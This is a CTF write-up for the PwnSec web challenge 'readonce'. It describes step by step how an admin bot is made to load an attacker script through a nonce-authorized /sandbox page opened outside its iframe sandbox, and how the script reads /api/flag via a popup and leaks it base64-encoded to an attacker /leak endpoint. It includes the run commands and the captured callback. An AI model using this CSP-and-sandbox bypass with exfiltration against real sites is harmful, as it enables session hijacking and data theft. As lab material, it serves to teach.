---
ctf: PwnSec
title: readonce
category: web
difficulty: unknown
tags: []
flag_format: pwnsec{}
date: 2026-09-12
---

# readonce

## Challenge
- @Macabely

## Approach
1. `POST /report` makes the admin bot visit our URL with a fresh `rid`. Before
   that visit, the bot authenticates and opens `/api/flag`, so its browser context
   has an admin session.
2. `GET /review` has a state-changing side effect: it copies the attacker-controlled
   `u` URL into `currentReview.document` and generates the nonce used by `/sandbox`.
   It does this for any request with the right public `rid`; no admin check is made.
3. Our bootstrap page requests
   `http://localhost:3000/review?rid=RID&u=http://localhost:8000/payload.js`
   as an image. The response need not render: handling the request prepares the
   document. The bootstrap then top-level navigates to
   `http://localhost:3000/sandbox?rid=RID`.
4. `/sandbox` emits `<script nonce="SERVER_NONCE" src="ATTACKER_URL">`. The CSP
   authorizes this script. The intended isolation comes only from the
   `sandbox="allow-scripts"` attribute used by `/review`'s iframe; opening
   `/sandbox` as a top-level document means no browser sandbox applies. Therefore
   our external script executes with the challenge origin and the bot's cookies.
5. `connect-src` prevents a direct `fetch`, but CSP does not restrict the popup or
   top-level navigation used here. The payload opens the same-origin `/api/flag`,
   reads the popup DOM, base64-encodes it, and navigates to our `/leak` endpoint.
6. On the hosted instance, the admin cookie belongs to the bot's internal
   `http://localhost:3000` origin. I prepared `currentReview.document` through the
   public HTTPS host, then navigated to
   `http://localhost:3000/sandbox?rid=RID`. This kept the preparation request free
   of mixed-content blocking while executing the final payload with the admin
   cookie.

Run locally:

```sh
node exploit.js
curl -X POST http://localhost:3000/report \
  --data-urlencode 'url=http://localhost:8000/'
```

The verified callback was:

```text
GET /leak?data=eyJmbGFnIjoicHduc2Vje2xvY2FsX3ZhbGlkYXRpb25fc3VjY2Vzc30ifQ%3D%3D
```

which decodes to `{"flag":"pwnsec{local_validation_success}"}`.

## Tools

- Node.js HTTP server
- Chromium/Puppeteer reviewer supplied with the challenge

## Lessons

- An iframe sandbox is a property of the embedding context, not the framed URL.
- A nonce does not make an attacker-controlled external script trustworthy.
- CSP navigation and popup behavior must be included in the threat model.

## Flag

`pwnsec{4c1f358448e2b496}`
